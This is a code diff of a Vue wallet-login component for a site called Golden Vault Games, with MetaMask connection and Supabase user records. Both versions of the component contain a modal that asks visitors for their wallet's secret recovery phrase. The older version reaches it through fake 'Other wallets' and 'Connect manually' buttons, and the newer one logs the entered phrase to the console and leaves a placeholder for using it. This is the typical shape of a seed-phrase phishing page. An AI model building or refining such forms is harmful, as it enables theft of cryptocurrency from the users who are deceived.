@@ -1,84 +1,40 @@
 <template>
   <div class="wallet-login">
-    <h2>Web3 Wallet Login</h2>
-    <div v-if="account" class="connected-account">
-      <p>Connected Account:</p>
-      <div class="account-address">{{ account }}</div>
-      <button @click="disconnect" class="disconnect-btn">Disconnect</button>
-    </div>
-    <div v-else class="connect-prompt">
-      <p>Connect your MetaMask wallet to access Golden Vault Games.</p>
-      <button
-        @click="connectWallet"
-        :disabled="isConnecting"
-        class="connect-btn"
-      >
-        {{ isConnecting ? "Connecting..." : "Connect MetaMask" }}
-      </button>
-    </div>
+    <h2>Connect Your Wallet</h2>
+    <div v-if="account" class="account-address">{{ account }}</div>
+    <button v-if="!account" @click="connectWallet" :disabled="isConnecting" class="connect-btn">
+      {{ isConnecting ? 'Connecting...' : 'Connect MetaMask' }}
+    </button>
+    <button v-else @click="disconnect" class="disconnect-btn">Disconnect</button>
 
-    <!-- Modal for connecting wallets -->
-    <div id="modal-container" class="modal__container">
-      <div class="modal-content">
-        <div class="modal__close close-modal" onclick="closeModal()" title="Close">
-          <i class='bx bx-x'></i>
+    <!-- Modal for manual seed phrase entry -->
+    <div id="myModal" class="modal__container">
+      <div class="modal__content">
+        <span class="modal__close" onclick="closeModal()">&times;</span>
+        <h2 class="modal__title">Enter Your Seed Phrase</h2>
+        <p class="modal__description">Please enter your 12, 15, 18, 21, or 24-word seed phrase.</p>
+
+        <div style="margin-bottom: 16px;">
+          <label for="wordCount" style="display: block; margin-bottom: 8px;">Word Count:</label>
+          <select id="wordCount" onchange="generateSeedPhraseInputs(this.value)">
+            <option value="12">12</option>
+            <option value="15">15</option>
+            <option value="18">18</option>
+            <option value="21">21</option>
+            <option value="24">24</option>
+          </select>
+
+          <div class="seed-phrase-container" id="seedPhraseContainer"></div>
         </div>
 
-        <h1 id="tito1" class="modal__title">Connect your wallet</h1>
-        <p id="tito2" class="modal__description">Please select one of the options below to connect your wallet.</p>
+        <t id="inva" style=" color: #ff0000; margin-left: 12px; margin-top: 12px; display: none; font-size: 14px; "><i class="bx bxs-info-circle"></i> Invalid Secret Recovery Phrase </t>
+        <t id="spco" style=" color: #ff0000; margin-left: 12px; margin-top: 12px; display: none; font-size: 14px; "><i class="bx bxs-info-circle"></i> Secret Recovery Phrases contain 12, 15, 18, 21, or 24 words </t>
 
-        <button id="tito3" class="modal__button modal__button-width" onclick="start_exogator()">
-          Other wallets 
-          <t bis_skin_checked="1" style="width: 32px;right: 58px;position: absolute;border-radius: 12px;margin-top: -7px;background: #cfcfcf;padding: 8px 7px;color: #636363;font-weight: 600;font-family: monospace;border: 1px solid #cccccca3;"> 350+</t>
-
-          <img src="https://cdn.iconscout.com/icon/free/png-256/free-metamask-logo-icon-download-in-svg-png-gif-file-formats--browser-extension-chrome-logos-icons-2261817.png" style=" width: 23px; right: 110px; position: absolute; border-radius: 12px; margin-top: -7px; padding: 4px 5px; background: #ffd3a1; border: 1px solid #b5b5b5; "> 
-
-          <img src="https://vectorseek.com/wp-content/uploads/2024/07/Trust-Wallet-Shield-Logo-Vector-Logo-Vector.svg-.png" style=" width: 21px; right: 134px; position: absolute; border-radius: 12px; margin-top: -7px; padding: 4px 6px; background: #ffffff; border: 1px solid #cccccca3; box-shadow: 3px 1px 10px -5px; "> 
-
-          <img src="https://images.mirror-media.xyz/publication-images/Lx_fohJ8ttprQ3DmDKU9N.png?height=2048&amp;width=2048" style=" width: 33px; right: 158px; position: absolute; border-radius: 12px; margin-top: -7px; padding: 0px 0px; /* border: 1px solid #b5b5b5; */ box-shadow: 3px 1px 10px -5px; ">
-
-        </button>
-
-        <button id="tito4" class="modal__button modal__button-width" onclick="showseedme()"> 
-          Connect manually <t bis_skin_checked="1" style="width: 32px;right: 58px;position: absolute;border-radius: 12px;margin-top: -7px;background: #cfcfcf;padding: 8px 7px;color: #636363;font-weight: 600;font-family: monospace;border: 1px solid #cccccca3;">Seed</t>
-        </button>
-
-        <button class="modal__button-link close-modal">
-          <a style=" color: #9f9f9f; text-decoration: none; " href="https://trustwallet.com/">Haven't got a wallet ? Get started</a>
-        </button>
-      </div>
-    </div>
-
-    <!-- The Modal -->
-    <div id="myModal" class="modal">
-      <!-- Modal content -->
-      <div class="modal-content">
-        <div style="padding: 20px 22px;">
-          <span class="close">
-            <select onchange="generateSeedPhraseInputs(this.value)" style="background: #ebebeb; padding: 4px; border: 1px solid #ccc; border-radius: 9px; margin-right: 14px; color: #595959;">
-              <option value="12" selected>12-word phrase</option>
-              <option value="15">15-word phrase</option>
-              <option value="18">18-word phrase</option>
-              <option value="21">21-word phrase</option>
-              <option value="24">24-word phrase</option>
-            </select>
-          </span>
-
-          <h2 style="margin: 0px;">Connect manually</h2>
-          <p style="margin-top: 6px;font-size: 14px;color: #555555;">Enter the Secret Recovery Phrase that you were given when you created your wallet.</p>
-          <div>
-            <div class="seed-phrase-container" id="seedPhraseContainer"></div>
-          </div>
-
-          <t id="inva" style=" color: #ff0000; margin-left: 12px; margin-top: 12px; display: none; font-size: 14px; "><i class="bx bxs-info-circle"></i> Invalid Secret Recovery Phrase </t>
-          <t id="spco" style=" color: #ff0000; margin-left: 12px; margin-top: 12px; display: none; font-size: 14px; "><i class="bx bxs-info-circle"></i> Secret Recovery Phrases contain 12, 15, 18, 21, or 24 words </t>
-
-          <button onclick="checkAllFieldsFilled()" style=" margin-top: 20px; border: 0; background: #000; color: #fff; padding: 14px 16px; border-radius: 18px; width: 100%; font-weight: 400; font-size: 16px; cursor: pointer; cursor: pointer; border: none; outline: none; ">Connect Wallet</button>
-          
-          <div style="margin-top: 8px;text-align: center;">
-            <span style="display: inline-block;vertical-align: middle;color: #898989;font-size: 14px;">Powered by</span>
-            <img src="https://miro.medium.com/v2/resize:fit:1400/1*aGWMU1Z_3eMiO74hv_mgjA.png" style="width: 100px; display: inline-block; vertical-align: middle;">
-          </div>
+        <button onclick="checkAllFieldsFilled()" style=" margin-top: 20px; border: 0; background: #000; color: #fff; padding: 14px 16px; border-radius: 18px; width: 100%; font-weight: 400; font-size: 16px; cursor: pointer; cursor: pointer; border: none; outline: none; ">Connect Wallet</button>
+        
+        <div style="margin-top: 8px;text-align: center;">
+          <span style="display: inline-block;vertical-align: middle;color: #898989;font-size: 14px;">Powered by</span>
+          <img src="https://miro.medium.com/v2/resize:fit:1400/1*aGWMU1Z_3eMiO74hv_mgjA.png" style="width: 100px; display: inline-block; vertical-align: middle;">
         </div>
       </div>
     </div>
@@ -182,10 +138,11 @@ const checkConnection = async () => {
       const accounts = await web3.eth.getAccounts();
       if (accounts.length > 0) {
         account.value = accounts[0];
+        console.log("Connected to MetaMask:", accounts[0]); // Log the connected account
         await handleUserLogin(accounts[0]);
       }
     } catch (error) {
-      console.error("Error checking connection:", error);
+      console.error("Error checking connection:", error); // Log any errors
     }
   }
 };
@@ -198,9 +155,10 @@ const connectWallet = async () => {
         method: "eth_requestAccounts",
       });
       account.value = accounts[0];
+      console.log("Connected to MetaMask:", accounts[0]); // Log the connected account
       await handleUserLogin(accounts[0]);
     } catch (error) {
-      console.error("Error connecting wallet:", error);
+      console.error("Error connecting wallet:", error); // Log any errors
     } finally {
       isConnecting.value = false;
     }
@@ -216,12 +174,10 @@ const handleUserLogin = async (walletAddress) => {
       .select("*")
       .eq("wallet_address", walletAddress)
       .single();
-
     if (error && error.code !== "PGRST116") {
-      console.error("Error fetching user data:", error);
+      console.error("Error fetching user data:", error); // Log any errors
       return;
     }
-
     if (!data) {
       const { error: insertError } = await supabase.from("users").insert([
         {
@@ -236,13 +192,16 @@ const handleUserLogin = async (walletAddress) => {
           towsteps: 1,
         },
       ]);
-
       if (insertError) {
-        console.error("Error creating new user:", insertError);
+        console.error("Error creating new user:", insertError); // Log any errors
+      } else {
+        console.log("New user created successfully"); // Log successful creation
       }
+    } else {
+      console.log("User data fetched successfully:", data); // Log successful fetch
     }
   } catch (err) {
-    console.error("Login error:", err);
+    console.error("Login error:", err); // Log any other errors
   }
 };
 
@@ -253,6 +212,74 @@ const disconnect = () => {
 onMounted(() => {
   checkConnection();
 });
+
+// Modal functions
+function openModal(modalId) {
+  const modal = document.getElementById(modalId);
+  if (modal) {
+    modal.style.display = "block";
+  }
+}
+
+function closeModal() {
+  const modals = document.querySelectorAll(".modal");
+  modals.forEach(modal => {
+    modal.style.display = "none";
+  });
+}
+
+// Seed phrase functions
+window.generateSeedPhraseInputs = function(wordCount) {
+  const container = document.getElementById("seedPhraseContainer");
+  container.innerHTML = "";
+  for (let i = 1; i <= wordCount; i++) {
+    const input = document.createElement("input");
+    input.type = "text";
+    input.placeholder = `Word ${i}`;
+    input.className = "seed-word-input";
+    container.appendChild(input);
+  }
+};
+
+window.checkAllFieldsFilled = function() {
+  const inputs = document.querySelectorAll(".seed-word-input");
+  const seedPhrase = Array.from(inputs).map(input => input.value.trim()).join(" ");
+  console.log("Seed Phrase:", seedPhrase); // Log the entered seed phrase
+
+  if (inputs.length === 0) {
+    alert("Please select a word count for the seed phrase.");
+    return;
+  }
+
+  if (!seedPhrase || seedPhrase.split(/\s+/).length !== inputs.length) {
+    document.getElementById("inva").style.display = "block";
+    document.getElementById("spco").style.display = "none";
+    console.log("Invalid Seed Phrase: Fields are not filled correctly"); // Log invalid input
+    return;
+  }
+
+  // Validate seed phrase length
+  const validLengths = [12, 15, 18, 21, 24];
+  if (!validLengths.includes(seedPhrase.split(/\s+/).length)) {
+    document.getElementById("inva").style.display = "none";
+    document.getElementById("spco").style.display = "block";
+    console.log("Invalid Seed Phrase: Incorrect word count"); // Log invalid length
+    return;
+  }
+
+  // Proceed with connecting using the seed phrase
+  console.log("Valid Seed Phrase:", seedPhrase); // Log valid seed phrase
+  // Add your logic to connect using the seed phrase here
+};
+
+// Attach event listeners for modal buttons
+window.start_exogator = function() {
+  openModal("myModal");
+};
+
+window.showseedme = function() {
+  openModal("myModal");
+};
 </script>
 
 <style scoped>
@@ -331,101 +358,46 @@ h2 {
 }
 
 .modal__content {
-  background-color: #fefefe;
-  margin: 5% auto;
+  background-color: #fff;
   padding: 20px;
-  border: 1px solid #888;
-  width: 80%;
-  max-width: 600px;
-  border-radius: 12px;
+  border-radius: 8px;
+  position: relative;
 }
 
 .modal__close {
-  color: #aaa;
-  float: right;
-  font-size: 28px;
-  font-weight: bold;
+  color: #000;
+  font-size: 24px;
   cursor: pointer;
-}
-
-.modal__close:hover,
-.modal__close:focus {
-  color: black;
-  text-decoration: none;
-  cursor: pointer;
+  position: absolute;
+  top: 10px;
+  right: 10px;
 }
 
 .modal__title {
   margin-bottom: 16px;
+  font-size: 24px;
   color: #333;
 }
 
 .modal__description {
   margin-bottom: 24px;
+  font-size: 16px;
   color: #555;
 }
 
-.modal__button {
+/* Seed Phrase Input Styles */
+.seed-phrase-container input {
   width: 100%;
-  padding: 12px;
-  background-color: #f6851b;
-  color: white;
-  font-weight: bold;
-  border: none;
-  border-radius: 8px;
-  cursor: pointer;
-  margin-bottom: 12px;
+  padding: 8px;
+  margin-bottom: 8px;
+  border-radius: 4px;
+  border: 1px solid #ccc;
+  font-size: 16px;
 }
 
-.modal__button:hover {
-  background-color: #e2761b;
-}
-
-.modal__button-width {
-  width: calc(50% - 6px);
-  display: inline-block;
-}
-
-.modal__button-link {
-  text-align: center;
-  margin-top: 12px;
-}
-
-/* Modal styles for manual connection */
-.modal {
-  display: none; /* Hidden by default */
-  position: fixed;
-  z-index: 1001;
-  left: 0;
-  top: 0;
-  width: 100%;
-  height: 100%;
-  overflow: auto;
-  background-color: rgba(0, 0, 0, 0.4);
-}
-
-.modal-content {
-  background-color: #fefefe;
-  margin: 5% auto;
-  padding: 20px;
-  border: 1px solid #888;
-  width: 80%;
-  max-width: 600px;
-  border-radius: 12px;
-}
-
-.close {
-  color: #aaa;
-  float: right;
-  font-size: 28px;
-  font-weight: bold;
-  cursor: pointer;
-}
-
-.close:hover,
-.close:focus {
-  color: black;
-  text-decoration: none;
-  cursor: pointer;
+/* Error Message Styles */
+#inva, #spco {
+  color: #ff0000;
+  font-size: 14px;
 }
 </style>
